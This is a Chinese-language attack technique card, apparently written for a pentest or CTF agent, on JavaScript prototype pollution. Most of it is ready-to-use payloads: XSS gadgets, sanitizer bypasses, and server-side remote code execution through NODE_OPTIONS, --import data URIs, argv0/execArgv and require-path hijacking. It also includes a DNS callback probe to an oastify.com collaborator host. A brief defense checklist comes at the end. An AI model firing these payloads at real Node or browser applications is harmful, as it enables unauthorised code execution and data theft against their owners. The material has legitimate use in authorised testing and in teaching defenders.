---
category: web
tags: [prototype_pollution, 原型链污染, pp2rce, pp2xss, __proto__, constructor_prototype, node_options, child_process, express, ejs, pug, lodash, deep_merge, server_side_prototype_pollution, client_side_prototype_pollution, dom_clobbering]
triggers: [prototype pollution, __proto__, constructor.prototype, merge, deepMerge, lodash.merge, _.merge, Object.prototype, NODE_OPTIONS, child_process, fork, spawn, 原型链污染, 原型污染, pp2rce, "json spaces", allowDots, body-parser]
related: [xss, command_injection, ssti]
---

# 原型链污染 (Prototype Pollution)

## 什么时候用

应用使用了不安全的对象合并/克隆操作（`merge`、`deepMerge`、`clone`），用户输入中的 `__proto__` 或 `constructor.prototype` 键值被递归赋值到 `Object.prototype`，从而影响程序中所有对象的默认属性。常见场景：
- Express 应用通过 `body-parser` 解析 JSON 并用 lodash/自定义 merge 合并对象
- 查询参数 `?__proto__[key]=value` 经 qs 库解析后触发污染
- 前端 JS 从 URL hash/search 取值执行深度合并
- GraphQL/REST API 接受嵌套 JSON 输入

## 前提条件

- 存在递归对象合并/克隆函数，且未过滤 `__proto__`、`constructor`、`prototype` 键
- 攻击者可以控制合并的源对象（通常通过 JSON 输入）
- 服务端：后续代码访问了被污染属性（存在 gadget）
- 客户端：被污染属性被 DOM sink 使用（如 `innerHTML`、`srcdoc`、`src`）

## 原理

JavaScript 中每个对象都有原型链。访问 `obj.prop` 时，若对象自身没有 `prop`，引擎会沿原型链向上查找直到 `Object.prototype`。

```javascript
// 两种等价的污染方式
obj.__proto__.polluted = "pwned";
obj.constructor.prototype.polluted = "pwned";

// 此后所有对象都继承了 polluted 属性
let victim = {};
console.log(victim.polluted); // "pwned"
```

典型的脆弱合并函数：

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof target[key] === "object" && typeof source[key] === "object") {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 攻击输入
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// 现在 ({}).isAdmin === true
```

## 攻击步骤

### 1. 检测是否存在原型链污染

#### 服务端安全探测（Express gadgets）

这些 payload 不会产生破坏性影响，适合黑盒探测：

```json
// json spaces — 若生效，返回的 JSON 缩进会多一个空格
{"__proto__": {"json spaces": " "}}

// status — 修改默认响应状态码
{"__proto__": {"status": 510}}

// exposedHeaders — 使响应携带 Access-Control-Expose-Headers
{"__proto__": {"exposedHeaders": ["foo"]}}

// OPTIONS 隐藏方法 — HEAD 方法从 Allow 头消失
{"__proto__": {"head": true}}
```

#### 客户端探测

```javascript
// 在 URL 中注入后检查 console
// ?__proto__[testprop]=testval
// ?constructor.prototype.testprop=testval

// 检查是否生效
Object.prototype.testprop === "testval"

// 调试 gadget — 用 defineProperty 追踪属性访问
Object.defineProperty(Object.prototype, "potentialGadget", {
  __proto__: null,
  get() { console.trace(); return "test"; }
});
```

自动化工具：
- **ppfuzz** — Rust 编写的模糊测试器，支持 ES modules / HTTP2 / WebSocket
- **ppmap** — 自动检测 PP 并枚举已知 gadget
- **PPScan** — 浏览器扩展，访问页面自动扫描
- **Burp DOM Invader** — v2023.6+ 内置 Prototype Pollution 检测标签页
- **protoStalker** — Chrome DevTools 插件，实时可视化原型链写入

### 2. 客户端 PP → XSS

找到 PP 入口后，需要找到 **gadget**（被污染属性被 sink 使用的代码路径）。

#### 常见 DOM gadget

```javascript
// innerHTML sink
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>";

// srcdoc sink（iframe）
Object.prototype.srcdoc = "<script>alert(1)<\/script>";

// src sink
Object.prototype.src = "javascript:alert(1)";
```

#### 浏览器内置全局 gadget（2023+ 研究，所有现代浏览器生效）

| Gadget 类 | 被读取属性 | 达成效果 |
|-----------|-----------|---------|
| `URL()` | `href` | `javascript:` 执行 |
| `Image` | `src` | `onerror` XSS |
| `Notification` | `title` | 点击触发 `alert()` |
| `Worker` | `name` | Worker 内 JS 执行 |
| `URLSearchParams` | `toString` | DOM Open Redirect |

```html
<script>
  // 污染 URL 构造器的 href 属性
  Object.prototype.href = "javascript:alert(document.domain)";
  new URL("#"); // 触发 JS 执行
</script>
```

#### 绕过 HTML Sanitizer

**DOMPurify ≤ 3.0.8 (CVE-2024-45801)**：污染 `Node.prototype.after` 可绕过 SAFE_FOR_TEMPLATES。

**sanitize-html < 2.8.1**：
```json
{"__proto__": {"innerHTML": "<img/src/onerror=alert(1)>"}}
```

**Google Closure**：
```javascript
Object.prototype["* ONERROR"] = 1;
Object.prototype["* SRC"] = 1;
// Closure Sanitizer 白名单被绕过
```

### 3. 服务端 PP → RCE (PP2RCE)

核心原理：Node.js `child_process` 模块的 `normalizeSpawnArguments` 会用 `for...in` 遍历 `options.env`，原型链上的属性也会被继承为环境变量。

#### 方法 A：通过 `env` + `NODE_OPTIONS` (fork)

最可靠的 gadget，`fork()` 全版本可用：

```javascript
// 通过 __proto__
{"__proto__": {
  "NODE_OPTIONS": "--require /proc/self/environ",
  "env": {
    "EVIL": "console.log(require('child_process').execSync('id').toString())//"
  }
}}

// 通过 constructor.prototype
{"constructor": {"prototype": {
  "NODE_OPTIONS": "--require /proc/self/environ",
  "env": {
    "EVIL": "console.log(require('child_process').execSync('id').toString())//"
  }
}}}
```

#### 方法 B：通过 `argv0` + `NODE_OPTIONS` (cmdline)

不需要控制 env，payload 通过 `/proc/self/cmdline` 注入：

```javascript
{"__proto__": {
  "NODE_OPTIONS": "--require /proc/self/cmdline",
  "argv0": "console.log(require('child_process').execSync('id').toString())//"
}}
```

#### 方法 C：`--import` data URI（Node ≥ 19，无需文件系统）

最强力的变体，完全不需要磁盘写入：

```javascript
// 构造 base64 payload
const js = "require('child_process').execSync('id')";
const b64 = Buffer.from(js).toString("base64");

{"__proto__": {
  "NODE_OPTIONS": "--import data:text/javascript;base64," + b64
}}
```

`--import` 优于 `--require` 的原因：
1. 不需要磁盘交互，payload 完全内存化
2. 在 ESM-only 环境下也能工作
3. 部分加固库只过滤 `--require`，不过滤 `--import`

#### 方法 D：stdin trick（execSync / spawnSync）

```javascript
{"__proto__": {
  "argv0": "/usr/bin/vim",
  "shell": "/usr/bin/vim",
  "input": ":!{touch /tmp/pwned}\n"
}}
```

#### 方法 E：execArgv trick（仅 fork）

```javascript
{"__proto__": {
  "execPath": "/bin/sh",
  "argv0": "/bin/sh",
  "execArgv": ["-c", "touch /tmp/pwned"]
}}
```

#### 各 child_process 函数 gadget 兼容性

| 函数 | env trick | cmdline trick | stdin trick | 备注 |
|------|-----------|--------------|-------------|------|
| `fork` | ✅ | ✅ | ❌ | 最可靠，还支持 execArgv |
| `exec` | ❌ (env=null) | ✅ | ❌ | 需设置 shell=/proc/self/exe |
| `execFile` | ❌ | ✅ | ❌ | 必须执行 node 本身 |
| `spawn` | ✅* | ✅* | ❌ | kEmptyObject 修复后需传 options |
| `execSync` | ✅ | ✅ | ✅ | |
| `execFileSync` | ✅ | ✅ | ✅ | |
| `spawnSync` | ✅* | ✅* | ✅* | kEmptyObject 修复后需传 options |

*标注：Node 18.4.0+ 的 `kEmptyObject` 修复后，需要调用时传入 options 参数才能生效。

#### DNS 探测（确认 PP 存在）

```json
{"__proto__": {
  "argv0": "node",
  "shell": "node",
  "NODE_OPTIONS": "--inspect=COLLAB_ID.oastify.com"
}}
```

### 4. Express Gadgets（服务端）

#### PP → XSS（修改 Content-Type）

当 Express 使用 `res.send(obj)` 且 body-parser 解析 JSON 时：

```json
{"__proto__": {"_body": true, "body": "<script>alert(1)</script>"}}
```

Express 会将 Content-Type 从 `application/json` 变为 `text/html` 并反射 body 内容。

#### UTF-7 Content-Type 篡改

```json
{"__proto__": {"content-type": "application/json; charset=utf-7"}}
```

#### allowDots — 启用查询参数对象创建

```json
{"__proto__": {"allowDots": true}}
```

之后 `?foo.bar=baz` 会被 qs 解析为嵌套对象 `{foo: {bar: "baz"}}`，可链接其他 PP。

### 5. 通过 require 路径劫持触发 RCE

当目标代码中有 `require()` 但无 `spawn/fork` 调用时，可以通过 PP 劫持 require 路径，加载系统中存在的含 child_process 调用的 JS 文件：

```javascript
// 绝对路径 require — 污染 main 属性
{"__proto__": {"main": "/tmp/malicious.js"}}
// require("bytes") 会加载 /tmp/malicious.js

// 相对路径 require — 污染 exports + 路径
{"__proto__": {
  "exports": {".": "./malicious.js"},
  "1": "/tmp"
}}
// require("./anything.js") 会加载 /tmp/malicious.js
```

系统上常见的含 spawn 调用的文件：
- `/path/to/npm/scripts/changelog.js`
- `/opt/yarn-v1.22.19/preinstall.js`
- `node_modules/detect-libc/bin/detect-libc.js`

## 常见坑

- Node 18.4.0+ 的 `kEmptyObject` 修复阻止了 `spawn` / `spawnSync` 的无参数利用，但 `fork` 不受影响
- Node 20/22 的 `CopyOptions()` 加固阻止了嵌套对象（如 `stdio`）的污染，但 `NODE_OPTIONS` / `--import` 仍然有效
- `exec()` 的 `options.env` 默认为 `null`（不是 `undefined`），env trick 不可用
- `--import data:` URI 在 Node 22.2.0+ 仍然有效，官方尚未限制
- 客户端 PP 即使只在前端库中存在，仍可通过反射参数、postMessage、存储数据远程利用
- `Object.freeze(Object.prototype)` 可以防御但可能破坏 polyfill
- `JSON.parse` 不会产生 `__proto__` 属性（安全），但 `qs` 等查询解析器可能会

## 变体

### 服务端 vs 客户端

| 维度 | 客户端 PP | 服务端 PP |
|------|----------|----------|
| 入口 | URL hash/search、postMessage、存储 | JSON body、查询参数、GraphQL |
| 影响 | XSS、Open Redirect、Sanitizer 绕过 | RCE、权限提升、逻辑绕过 |
| 检测 | DOM Invader、ppfuzz、ppmap | json spaces、status 码、DNS 回调 |

### 已知 CVE

- **DOMPurify ≤ 3.0.8** (CVE-2024-45801) — 污染 `Node.prototype.after` 绕过 SAFE_FOR_TEMPLATES
- **jQuery 3.6.0-3.6.3** (CVE-2023-26136) — `extend()` 递归合并从 `location.hash` 来的恶意对象
- **sanitize-html < 2.8.1** (2023) — `__proto__` 属性名绕过白名单
- **Kibana** (CVE-2019-7609) — 经典 PP2RCE，通过 `child_process.fork` + `NODE_OPTIONS`

## 防御检查清单

1. 使用 `Object.create(null)` 创建无原型对象作为内部 map
2. 合并前过滤 `__proto__`、`constructor`、`prototype` 键
3. 使用 `structuredClone()` 代替手写 deepMerge
4. 升级 lodash ≥ 4.17.22 / deepmerge ≥ 5.3.0（内置原型保护）
5. 首个 `<script>` 中执行 `Object.freeze(Object.prototype)`
6. CSP 配置 `script-src 'self'` + 严格 nonce

## 相关技术

- [[xss]] — 客户端 PP 的最终利用目标
- [[command_injection]] — 服务端 PP2RCE 的底层原理
- [[ssti]] — 模板引擎 gadget（EJS/Pug 的 PP 可导致 SSTI→RCE）
